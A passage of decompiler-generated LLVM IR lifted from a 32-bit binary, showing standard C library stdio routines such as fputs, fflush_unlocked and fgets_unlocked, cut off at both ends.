  %v2_805288e = inttoptr i32 %v1_805288e to i32*
  %v3_805288e = load i32, i32* %v2_805288e, align 4
  store i32 %v3_805288e, i32* @edi, align 4
  %v1_8052891 = icmp eq i32 %v3_805288e, 0
  %v1_8052893 = icmp eq i1 %v1_8052891, false
  br i1 %v1_8052893, label %entry.dec_label_pc_80528b4_crit_edge, label %dec_label_pc_8052895

entry.dec_label_pc_80528b4_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80528b4

dec_label_pc_8052895:                             ; preds = %entry
  %v1_8052895 = add i32 %arg3, 56
  store i32 %v1_8052895, i32* @ebx, align 4
  store i32 %v12_8052887, i32* @eax, align 4
  %v2_80528a4 = call i32 @__pthread_return_void(i32 %v12_8052887, i32 134566343)
  %v0_80528a9 = load i32, i32* @ebx, align 4
  %v1_80528ac = call i32 @__pthread_return_0(i32 %v0_80528a9)
  %v0_80528b5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80528b4

dec_label_pc_80528b4:                             ; preds = %entry.dec_label_pc_80528b4_crit_edge, %dec_label_pc_8052895
  %v0_80528b5 = phi i32 [ %arg3, %entry.dec_label_pc_80528b4_crit_edge ], [ %v0_80528b5.pre, %dec_label_pc_8052895 ]
  %v0_80528b4 = load i32, i32* @edx, align 4
  %v4_80528be = inttoptr i32 %arg1 to i8*
  %v5_80528be = call i32 @__GI_fgets_unlocked(i8* %v4_80528be, i32 %arg2, i32 %v0_80528b5, i32 %v0_80528b4)
  store i32 %v5_80528be, i32* %ebx.global-to-local, align 4
  br i1 %v1_8052893, label %dec_label_pc_80528dd, label %dec_label_pc_80528cc

dec_label_pc_80528cc:                             ; preds = %dec_label_pc_80528b4
  store i32 %v12_8052887, i32* @eax, align 4
  %v2_80528d5 = call i32 @__pthread_return_void(i32 %v12_8052887, i32 1)
  %v0_80528e0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80528dd

dec_label_pc_80528dd:                             ; preds = %dec_label_pc_80528b4, %dec_label_pc_80528cc
  %v0_80528e0 = phi i32 [ %v5_80528be, %dec_label_pc_80528b4 ], [ %v0_80528e0.pre, %dec_label_pc_80528cc ]
  store i32 %v0_8052886, i32* @ebx, align 4
  store i32 %v0_8052885, i32* @esi, align 4
  store i32 %v0_8052884, i32* @edi, align 4
  ret i32 %v0_80528e0

; uselistorder directives
  uselistorder i32 %v12_8052887, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80528dd, { 1, 0 }
  uselistorder label %dec_label_pc_80528b4, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_80528e8 = load i32, i32* @edi, align 4
  %v0_80528e9 = load i32, i32* @esi, align 4
  %v0_80528ea = load i32, i32* @ebx, align 4
  %v12_80528eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_80528f2 = add i32 %arg2, 52
  %v2_80528f2 = inttoptr i32 %v1_80528f2 to i32*
  %v3_80528f2 = load i32, i32* %v2_80528f2, align 4
  store i32 %v3_80528f2, i32* @edi, align 4
  %v1_80528f5 = icmp eq i32 %v3_80528f2, 0
  %v1_80528f7 = icmp eq i1 %v1_80528f5, false
  br i1 %v1_80528f7, label %entry.dec_label_pc_8052918_crit_edge, label %dec_label_pc_80528f9

entry.dec_label_pc_8052918_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8052918

dec_label_pc_80528f9:                             ; preds = %entry
  %v1_80528f9 = add i32 %arg2, 56
  store i32 %v1_80528f9, i32* @ebx, align 4
  store i32 %v12_80528eb, i32* @eax, align 4
  %v2_8052908 = call i32 @__pthread_return_void(i32 %v12_80528eb, i32 134566343)
  %v0_805290d = load i32, i32* @ebx, align 4
  %v1_8052910 = call i32 @__pthread_return_0(i32 %v0_805290d)
  %v0_805291a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052918

dec_label_pc_8052918:                             ; preds = %entry.dec_label_pc_8052918_crit_edge, %dec_label_pc_80528f9
  %v0_805291a = phi i32 [ %arg2, %entry.dec_label_pc_8052918_crit_edge ], [ %v0_805291a.pre, %dec_label_pc_80528f9 ]
  %v0_8052918 = load i32, i32* @edx, align 4
  %v4_805291f = inttoptr i32 %arg1 to i8*
  %v5_805291f = call i32 @__GI_fputs_unlocked(i8* %v4_805291f, i32 %v0_805291a, i32 %v0_8052918, i32 %v0_8052918)
  store i32 %v5_805291f, i32* %ebx.global-to-local, align 4
  br i1 %v1_80528f7, label %dec_label_pc_805293e, label %dec_label_pc_805292d

dec_label_pc_805292d:                             ; preds = %dec_label_pc_8052918
  store i32 %v12_80528eb, i32* @eax, align 4
  %v2_8052936 = call i32 @__pthread_return_void(i32 %v12_80528eb, i32 1)
  %v0_8052941.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805293e

dec_label_pc_805293e:                             ; preds = %dec_label_pc_8052918, %dec_label_pc_805292d
  %v0_8052941 = phi i32 [ %v5_805291f, %dec_label_pc_8052918 ], [ %v0_8052941.pre, %dec_label_pc_805292d ]
  store i32 %v0_80528ea, i32* @ebx, align 4
  store i32 %v0_80528e9, i32* @esi, align 4
  store i32 %v0_80528e8, i32* @edi, align 4
  ret i32 %v0_8052941

; uselistorder directives
  uselistorder i32 %v12_80528eb, { 2, 3, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805293e, { 1, 0 }
  uselistorder label %dec_label_pc_8052918, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8052957 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8052957, i32* @eax, align 4
  %v2_805295c = call i32 @__pthread_return_void(i32 %v2_8052957, i32 134566343)
  %v1_8052968 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c2b4.472 to i32))
  %v0_805296d = load i32, i32* @global_var_8060544.473, align 4
  %v8_8052975 = icmp eq i32 %v0_805296d, 1
  %v1_8052976 = icmp eq i1 %v8_8052975, false
  br i1 %v1_8052976, label %dec_label_pc_8052a0d, label %dec_label_pc_805297c

dec_label_pc_805297c:                             ; preds = %entry
  %v0_805297c = load i32, i32* @global_var_8060548.474, align 8
  %tmp29 = icmp slt i32 %v0_805297c, 1
  br i1 %tmp29, label %dec_label_pc_8052a0d, label %dec_label_pc_8052989

dec_label_pc_8052989:                             ; preds = %dec_label_pc_805297c
  store i32 0, i32* @esi, align 4
  %v2_8052996 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8052996, i32* @eax, align 4
  %v2_805299b = call i32 @__pthread_return_void(i32 %v2_8052996, i32 134566343)
  %v1_80529a7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c29c.476 to i32))
  %v0_80529ac = load i32, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 8
  store i32 %v0_80529ac, i32* %edx.global-to-local, align 4
  %v1_80529ee3 = icmp eq i32 %v0_80529ac, 0
  %v1_80529f010 = icmp eq i1 %v1_80529ee3, false
  br i1 %v1_80529f010, label %dec_label_pc_80529b7, label %dec_label_pc_80529f2

dec_label_pc_80529b7:                             ; preds = %dec_label_pc_8052989, %dec_label_pc_80529ec
  %v1_80529b714.in = phi i32 [ %v0_80529ec, %dec_label_pc_80529ec ], [ %v0_80529ac, %dec_label_pc_8052989 ]
  %v1_80529b714 = inttoptr i32 %v1_80529b714.in to i16*
  %v2_80529b7 = load i16, i16* %v1_80529b714, align 2
  %v1_80529ba = add i32 %v1_80529b714.in, 32
  %v2_80529ba = inttoptr i32 %v1_80529ba to i32*
  %v3_80529ba = load i32, i32* %v2_80529ba, align 4
  store i32 %v3_80529ba, i32* @ebx, align 4
  %v1_80529bd = and i16 %v2_80529b7, -32720
  %v6_80529c2 = icmp eq i16 %v1_80529bd, 48
  br i1 %v6_80529c2, label %dec_label_pc_80529cb, label %dec_label_pc_80529c7

dec_label_pc_80529c7:                             ; preds = %dec_label_pc_80529b7
  store i32 %v1_80529b714.in, i32* @esi, align 4
  br label %dec_label_pc_80529ec

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_80529b7
  %v0_80529cb = load i32, i32* @esi, align 4
  %v1_80529cb = icmp eq i32 %v0_80529cb, 0
  %v1_80529cd = icmp eq i1 %v1_80529cb, false
  br i1 %v1_80529cd, label %dec_label_pc_80529d7, label %dec_label_pc_80529cf

dec_label_pc_80529cf:                             ; preds = %dec_label_pc_80529cb
  store i32 %v3_80529ba, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 8
  br label %dec_label_pc_80529da

dec_label_pc_80529d7:                             ; preds = %dec_label_pc_80529cb
  %v2_80529d7 = add i32 %v0_80529cb, 32
  %v3_80529d7 = inttoptr i32 %v2_80529d7 to i32*
  store i32 %v3_80529ba, i32* %v3_80529d7, align 4
  %v0_80529da.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80529da

dec_label_pc_80529da:                             ; preds = %dec_label_pc_80529cf, %dec_label_pc_80529d7
  %v0_80529e3 = phi i32 [ %v1_80529b714.in, %dec_label_pc_80529cf ], [ %v0_80529da.pre, %dec_label_pc_80529d7 ]
  %v1_80529da = add i32 %v0_80529e3, 1
  %v2_80529da = inttoptr i32 %v1_80529da to i8*
  %v3_80529da = load i8, i8* %v2_80529da, align 1
  %v4_80529da = and i8 %v3_80529da, 32
  %v5_80529da = icmp eq i8 %v4_80529da, 0
  br i1 %v5_80529da, label %dec_label_pc_80529ec, label %dec_label_pc_80529e0

dec_label_pc_80529e0:                             ; preds = %dec_label_pc_80529da
  %v1_80529e4 = call i32 @free(i32 %v0_80529e3)
  br label %dec_label_pc_80529ec

dec_label_pc_80529ec:                             ; preds = %dec_label_pc_80529da, %dec_label_pc_80529c7, %dec_label_pc_80529e0
  %v0_80529ec = load i32, i32* @ebx, align 4
  store i32 %v0_80529ec, i32* %edx.global-to-local, align 4
  %v1_80529ee = icmp eq i32 %v0_80529ec, 0
  %v1_80529f0 = icmp eq i1 %v1_80529ee, false
  br i1 %v1_80529f0, label %dec_label_pc_80529b7, label %dec_label_pc_80529f2

dec_label_pc_80529f2:                             ; preds = %dec_label_pc_80529ec, %dec_label_pc_8052989
  store i32 %v2_8052996, i32* @eax, align 4
  %v2_80529fb = call i32 @__pthread_return_void(i32 %v2_8052996, i32 1)
  store i32 0, i32* @global_var_8060548.474, align 8
  %v0_8052a0d.pre = load i32, i32* @global_var_8060544.473, align 4
  br label %dec_label_pc_8052a0d

dec_label_pc_8052a0d:                             ; preds = %dec_label_pc_805297c, %entry, %dec_label_pc_80529f2
  %v0_8052a0d = phi i32 [ %v0_805296d, %dec_label_pc_805297c ], [ %v0_805296d, %entry ], [ %v0_8052a0d.pre, %dec_label_pc_80529f2 ]
  %v1_8052a12 = add i32 %v0_8052a0d, -1
  store i32 %v1_8052a12, i32* @global_var_8060544.473, align 4
  store i32 %v2_8052957, i32* @eax, align 4
  %v2_8052a21 = call i32 @__pthread_return_void(i32 %v2_8052957, i32 1)
  ret i32 %v2_8052a21

; uselistorder directives
  uselistorder i32 %v0_80529ec, { 1, 2, 0 }
  uselistorder i32 %v1_80529b714.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805296d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052a0d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80529ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80529da, { 1, 0 }
  uselistorder label %dec_label_pc_80529b7, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8052a2c = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_8052a2f = load i32, i32* @edi, align 4
  %v0_8052a30 = load i32, i32* @esi, align 4
  %v0_8052a31 = load i32, i32* @ebx, align 4
  %v4_8052a35 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8052a35, i32* @ebx, align 4
  %v10_8052a39 = icmp eq i16* %arg1, inttoptr (i32 134595224 to i16*)
  br i1 %v10_8052a39, label %dec_label_pc_8052a4d, label %dec_label_pc_8052a41

dec_label_pc_8052a41:                             ; preds = %entry
  %v2_8052a41 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_8052a47 = icmp eq i1 %v2_8052a41, false
  br i1 %v1_8052a47, label %dec_label_pc_8052b45, label %dec_label_pc_8052a4d

dec_label_pc_8052a4d:                             ; preds = %dec_label_pc_8052a41, %entry
  store i32 0, i32* @edi, align 4
  %v2_8052a5a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052a5a, i32* @ebx, align 4
  %v2_8052a5f = call i32 @__pthread_return_void(i32 %v2_8052a5a, i32 134566343)
  %v1_8052a6b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c2b4.472 to i32))
  %v0_8052a70 = load i32, i32* @global_var_8060544.473, align 4
  store i32 ptrtoint (i32* @global_var_805c2b4.472 to i32), i32* @ecx, align 4
  %v1_8052a77 = add i32 %v0_8052a70, 1
  store i32 %v1_8052a77, i32* @eax, align 4
  store i32 %v1_8052a77, i32* @global_var_8060544.473, align 4
  %v2_8052a80 = call i32 @__pthread_return_void(i32 %v2_8052a5a, i32 1)
  store i32 %v2_8052a80, i32* @eax, align 4
  %v2_8052a93 = call i32 @__pthread_return_void(i32 %v2_8052a5a, i32 134566343)
  %v1_8052a9f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c29c.476 to i32))
  %v0_8052aa4 = load i32, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 8
  store i32 %v0_8052aa4, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805c29c.476 to i32), i32* @eax, align 4
  %v2_8052aaf = call i32 @__pthread_return_void(i32 %v2_8052a5a, i32 1)
  %v0_8052b361 = load i32, i32* @esi, align 4
  %v1_8052b362 = icmp eq i32 %v0_8052b361, 0
  %v1_8052b389 = icmp eq i1 %v1_8052b362, false
  br i1 %v1_8052b389, label %dec_label_pc_8052ab9, label %dec_label_pc_8052b3e

dec_label_pc_8052ab9:                             ; preds = %dec_label_pc_8052a4d, %dec_label_pc_8052b33
  %v0_8052ac7 = phi i32 [ %v3_8052b33, %dec_label_pc_8052b33 ], [ %v0_8052b361, %dec_label_pc_8052a4d ]
  %v1_8052ab9 = inttoptr i32 %v0_8052ac7 to i8*
  %v2_8052ab9 = load i8, i8* %v1_8052ab9, align 1
  %v3_8052ab9 = and i8 %v2_8052ab9, 64
  %v4_8052ab9 = icmp eq i8 %v3_8052ab9, 0
  br i1 %v4_8052ab9, label %dec_label_pc_8052b33, label %dec_label_pc_8052abe

dec_label_pc_8052abe:                             ; preds = %dec_label_pc_8052ab9
  %v0_8052abe = load i32, i32* @global_var_805c2cc.475, align 4
  %v9_8052abe = icmp eq i32 %v0_8052abe, 2
  br i1 %v9_8052abe, label %dec_label_pc_8052ae6, label %dec_label_pc_8052ac7

dec_label_pc_8052ac7:                             ; preds = %dec_label_pc_8052abe
  %v1_8052ac7 = add i32 %v0_8052ac7, 56
  store i32 %v1_8052ac7, i32* @ebx, align 4
  store i32 %v2_8052a5a, i32* @eax, align 4
  %v2_8052ad6 = call i32 @__pthread_return_void(i32 %v2_8052a5a, i32 134566343)
  %v0_8052adb = load i32, i32* @ebx, align 4
  %v1_8052ade = call i32 @__pthread_return_0(i32 %v0_8052adb)
  %v0_8052ae6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052ae6

dec_label_pc_8052ae6:                             ; preds = %dec_label_pc_8052abe, %dec_label_pc_8052ac7
  %v0_8052af9 = phi i32 [ %v0_8052ac7, %dec_label_pc_8052abe ], [ %v0_8052ae6.pre, %dec_label_pc_8052ac7 ]
  %v1_8052ae6 = inttoptr i32 %v0_8052af9 to i32*
  %v2_8052ae6 = load i32, i32* %v1_8052ae6, align 4
  %v1_8052ae8 = load i32, i32* @ebp, align 4
  %v2_8052ae8 = or i32 %v1_8052ae8, %v2_8052ae6
  %v1_8052aea = and i32 %v2_8052ae8, 832
  %v2_8052aef = icmp eq i32 %v1_8052aea, 320
  %v1_8052af4 = icmp eq i1 %v2_8052aef, false
  br i1 %v1_8052af4, label %dec_label_pc_8052b19, label %dec_label_pc_8052af6

dec_label_pc_8052af6:                             ; preds = %dec_label_pc_8052ae6
  %v1_8052afa = call i32 @__stdio_wcommit(i32 %v0_8052af9)
  %v1_8052b02 = icmp eq i32 %v1_8052afa, 0
  br i1 %v1_8052b02, label %dec_label_pc_8052b0b, label %dec_label_pc_8052b06

dec_label_pc_8052b06:                             ; preds = %dec_label_pc_8052af6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8052b19

dec_label_pc_8052b0b:                             ; preds = %dec_label_pc_8052af6
  %v0_8052b0b = load i32, i32* @esi, align 4
  %v1_8052b0b = add i32 %v0_8052b0b, 8
  %v2_8052b0b = inttoptr i32 %v1_8052b0b to i32*
  %v3_8052b0b = load i32, i32* %v2_8052b0b, align 4
  %v2_8052b0e = add i32 %v0_8052b0b, 28
  %v3_8052b0e = inttoptr i32 %v2_8052b0e to i32*
  store i32 %v3_8052b0b, i32* %v3_8052b0e, align 4
  %v0_8052b11 = load i32, i32* @esi, align 4
  %v1_8052b11 = inttoptr i32 %v0_8052b11 to i32*
  %v2_8052b11 = load i32, i32* %v1_8052b11, align 4
  %v2_8052b11.tr = trunc i32 %v2_8052b11 to i16
  %v1_8052b16 = and i16 %v2_8052b11.tr, -65
  %v3_8052b16 = inttoptr i32 %v0_8052b11 to i16*
  store i16 %v1_8052b16, i16* %v3_8052b16, align 2
  br label %dec_label_pc_8052b19

dec_label_pc_8052b19:                             ; preds = %dec_label_pc_8052ae6, %dec_label_pc_8052b06, %dec_label_pc_8052b0b
  %v0_8052b19 = load i32, i32* @global_var_805c2cc.475, align 4
  %v9_8052b19 = icmp eq i32 %v0_8052b19, 2
  br i1 %v9_8052b19, label %dec_label_pc_8052b33, label %dec_label_pc_8052b22

dec_label_pc_8052b22:                             ; preds = %dec_label_pc_8052b19
  store i32 %v2_8052a5a, i32* @eax, align 4
  %v2_8052b2b = call i32 @__pthread_return_void(i32 %v2_8052a5a, i32 1)
  br label %dec_label_pc_8052b33

dec_label_pc_8052b33:                             ; preds = %dec_label_pc_8052b19, %dec_label_pc_8052ab9, %dec_label_pc_8052b22
  %v0_8052b33 = load i32, i32* @esi, align 4
  %v1_8052b33 = add i32 %v0_8052b33, 32
  %v2_8052b33 = inttoptr i32 %v1_8052b33 to i32*
  %v3_8052b33 = load i32, i32* %v2_8052b33, align 4
  store i32 %v3_8052b33, i32* @esi, align 4
  %v1_8052b36 = icmp eq i32 %v3_8052b33, 0
  %v1_8052b38 = icmp eq i1 %v1_8052b36, false
  br i1 %v1_8052b38, label %dec_label_pc_8052ab9, label %dec_label_pc_8052b3e

dec_label_pc_8052b3e:                             ; preds = %dec_label_pc_8052b33, %dec_label_pc_8052a4d
  %v0_8052b3e = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8052b6f

dec_label_pc_8052b45:                             ; preds = %dec_label_pc_8052a41
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8052b47 = load i8, i8* %tmp23, align 1
  %v4_8052b47 = and i8 %v3_8052b47, 64
  %v5_8052b47 = icmp eq i8 %v4_8052b47, 0
  br i1 %v5_8052b47, label %dec_label_pc_8052b6f, label %dec_label_pc_8052b4c

dec_label_pc_8052b4c:                             ; preds = %dec_label_pc_8052b45
  store i32 -1, i32* @edi, align 4
  %v1_8052b53 = call i32 @__stdio_wcommit(i32 %v4_8052a35)
  %v1_8052b5b = icmp eq i32 %v1_8052b53, 0
  %v1_8052b5d = icmp eq i1 %v1_8052b5b, false
  br i1 %v1_8052b5d, label %dec_label_pc_8052b6f, label %dec_label_pc_8052b5f

dec_label_pc_8052b5f:                             ; preds = %dec_label_pc_8052b4c
  %v2_8052b5f = add i32 %v4_8052a35, 8
  %v3_8052b5f = inttoptr i32 %v2_8052b5f to i32*
  %v4_8052b5f = load i32, i32* %v3_8052b5f, align 4
  store i32 0, i32* @edi, align 4
  %v3_8052b64 = add i32 %v4_8052a35, 28
  %v4_8052b64 = inttoptr i32 %v3_8052b64 to i32*
  store i32 %v4_8052b5f, i32* %v4_8052b64, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_8052b67 = load i32, i32* %tmp24, align 4
  %v3_8052b67.tr = trunc i32 %v3_8052b67 to i16
  %v1_8052b6c = and i16 %v3_8052b67.tr, -65
  store i16 %v1_8052b6c, i16* %arg1, align 2
  br label %dec_label_pc_8052b6f

dec_label_pc_8052b6f:                             ; preds = %dec_label_pc_8052b4c, %dec_label_pc_8052b45, %dec_label_pc_8052b3e, %dec_label_pc_8052b5f
  %v0_8052b72 = load i32, i32* @edi, align 4
  store i32 %v0_8052a31, i32* @ebx, align 4
  store i32 %v0_8052a30, i32* @esi, align 4
  store i32 %v0_8052a2f, i32* @edi, align 4
  store i32 %v0_8052a2c, i32* @ebp, align 4
  ret i32 %v0_8052b72

; uselistorder directives
  uselistorder i32 %v3_8052b33, { 1, 2, 0 }
  uselistorder i32 %v2_8052a5a, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_805c298.477 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8060544.473, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805c2b4.472 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 4, 3, 2, 0, 5 }
  uselistorder label %dec_label_pc_8052b6f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052b33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052b19, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052ae6, { 1, 0 }
  uselistorder label %dec_label_pc_8052ab9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8052b7c = load i32, i32* @ebp, align 4
  %v4_8052b87 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052b87, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8052b87, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8052bcd.preheader, label %dec_label_pc_8052bd9

dec_label_pc_8052bcd.preheader:                   ; preds = %entry
  %v1_8052bcd19 = add i32 %arg2, -1
  %v8_8052bcd23 = icmp eq i32 %v1_8052bcd19, 0
  store i32 %v1_8052bcd19, i32* @esi, align 4
  %v1_8052bce25 = icmp eq i1 %v8_8052bcd23, false
  br i1 %v1_8052bce25, label %dec_label_pc_8052b97, label %dec_label_pc_8052bd0

dec_label_pc_8052b97:                             ; preds = %dec_label_pc_8052bcd.preheader, %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge.dec_label_pc_8052b97_crit_edge
  %v0_8052b97 = phi i32 [ %v0_8052b97.pre, %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge.dec_label_pc_8052b97_crit_edge ], [ %arg3, %dec_label_pc_8052bcd.preheader ]
  %v1_8052b97 = add i32 %v0_8052b97, 16
  %v2_8052b97 = inttoptr i32 %v1_8052b97 to i32*
  %v3_8052b97 = load i32, i32* %v2_8052b97, align 4
  store i32 %v3_8052b97, i32* %eax.global-to-local, align 4
  %v2_8052b9a = add i32 %v0_8052b97, 24
  %v3_8052b9a = inttoptr i32 %v2_8052b9a to i32*
  %v4_8052b9a = load i32, i32* %v3_8052b9a, align 4
  %v10_8052b9a = icmp ult i32 %v3_8052b97, %v4_8052b9a
  %v1_8052b9d = icmp eq i1 %v10_8052b9a, false
  br i1 %v1_8052b9d, label %dec_label_pc_8052bad, label %dec_label_pc_8052b9f

dec_label_pc_8052b9f:                             ; preds = %dec_label_pc_8052b97
  %v1_8052b9f = inttoptr i32 %v3_8052b97 to i8*
  %v2_8052b9f = load i8, i8* %v1_8052b9f, align 1
  %v3_8052b9f = zext i8 %v2_8052b9f to i32
  %v4_8052b9f = load i32, i32* @edx, align 4
  %v5_8052b9f = and i32 %v4_8052b9f, -256
  %v6_8052b9f = or i32 %v5_8052b9f, %v3_8052b9f
  store i32 %v6_8052b9f, i32* @edx, align 4
  %v1_8052ba1 = add i32 %v3_8052b97, 1
  store i32 %v1_8052ba1, i32* %eax.global-to-local, align 4
  %v2_8052ba2 = load i32, i32* @ebx, align 4
  %v3_8052ba2 = inttoptr i32 %v2_8052ba2 to i8*
  store i8 %v2_8052b9f, i8* %v3_8052ba2, align 1
  %v0_8052ba4 = load i32, i32* @ebx, align 4
  %v1_8052ba4 = add i32 %v0_8052ba4, 1
  store i32 %v1_8052ba4, i32* @ebx, align 4
  %v0_8052ba5 = load i32, i32* @edx, align 4
  %v1_8052ba5 = trunc i32 %v0_8052ba5 to i8
  %v10_8052ba5 = icmp eq i8 %v1_8052ba5, 10
  %v0_8052ba8 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ba8 = load i32, i32* @ebp, align 4
  %v2_8052ba8 = add i32 %v1_8052ba8, 16
  %v3_8052ba8 = inttoptr i32 %v2_8052ba8 to i32*
  store i32 %v0_8052ba8, i32* %v3_8052ba8, align 4
  br i1 %v10_8052ba5, label %dec_label_pc_8052bd0, label %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge

dec_label_pc_8052bad:                             ; preds = %dec_label_pc_8052b97
  %v0_8052bb1 = call i32 @getc_unlocked()
  %v1_8052bb1 = trunc i32 %v0_8052bb1 to i8
  store i32 %v0_8052bb1, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_8052bb1, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_8052bbc = icmp eq i1 %tmp, false
  br i1 %v1_8052bbc, label %dec_label_pc_8052bcb, label %dec_label_pc_8052bbe

dec_label_pc_8052bbe:                             ; preds = %dec_label_pc_8052bad
  %v0_8052bbe = load i32, i32* @ebp, align 4
  %v1_8052bbe = inttoptr i32 %v0_8052bbe to i8*
  %v2_8052bbe = load i8, i8* %v1_8052bbe, align 1
  %v3_8052bbe = and i8 %v2_8052bbe, 8
  %v4_8052bbe = icmp eq i8 %v3_8052bbe, 0
  br i1 %v4_8052bbe, label %dec_label_pc_8052bd0, label %dec_label_pc_8052bd9

dec_label_pc_8052bcb:                             ; preds = %dec_label_pc_8052bad
  %v3_8052bc6 = load i32, i32* @ebx, align 4
  %v4_8052bc6 = inttoptr i32 %v3_8052bc6 to i8*
  store i8 %v1_8052bb1, i8* %v4_8052bc6, align 1
  %v0_8052bc8 = load i32, i32* @ebx, align 4
  %v1_8052bc8 = add i32 %v0_8052bc8, 1
  store i32 %v1_8052bc8, i32* @ebx, align 4
  %v11_8052bc9 = icmp eq i8 %v1_8052bb1, 10
  br i1 %v11_8052bc9, label %dec_label_pc_8052bd0, label %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge

dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge: ; preds = %dec_label_pc_8052b9f, %dec_label_pc_8052bcb
  %v0_8052bcd.pre = load i32, i32* @esi, align 4
  %v1_8052bcd = add i32 %v0_8052bcd.pre, -1
  %v8_8052bcd = icmp eq i32 %v1_8052bcd, 0
  store i32 %v1_8052bcd, i32* @esi, align 4
  %v1_8052bce = icmp eq i1 %v8_8052bcd, false
  br i1 %v1_8052bce, label %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge.dec_label_pc_8052b97_crit_edge, label %dec_label_pc_8052bd0

dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge.dec_label_pc_8052b97_crit_edge: ; preds = %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge
  %v0_8052b97.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052b97

dec_label_pc_8052bd0:                             ; preds = %dec_label_pc_8052bcd.preheader, %dec_label_pc_8052b9f, %dec_label_pc_8052bcb.dec_label_pc_8052bcd_crit_edge, %dec_label_pc_8052bcb, %dec_label_pc_8052bbe
  %v0_8052bd0 = load i32, i32* @ebx, align 4
  %v1_8052bd0 = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_8052bd0, %v1_8052bd0
  br i1 %tmp27, label %dec_label_pc_8052bd4, label %dec_label_pc_8052bd9

dec_label_pc_8052bd4:                             ; preds = %dec_label_pc_8052bd0
  %v1_8052bd4 = inttoptr i32 %v0_8052bd0 to i8*
  store i8 0, i8* %v1_8052bd4, align 1
  %v0_8052bde.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8052bdb

dec_label_pc_8052bd9:                             ; preds = %dec_label_pc_8052bd0, %dec_label_pc_8052bbe, %entry
  br label %dec_label_pc_8052bdb

dec_label_pc_8052bdb:                             ; preds = %dec_label_pc_8052bd4, %dec_label_pc_8052bd9
  %v0_8052bde = phi i32 [ %v0_8052bde.pre, %dec_label_pc_8052bd4 ], [ 0, %dec_label_pc_8052bd9 ]
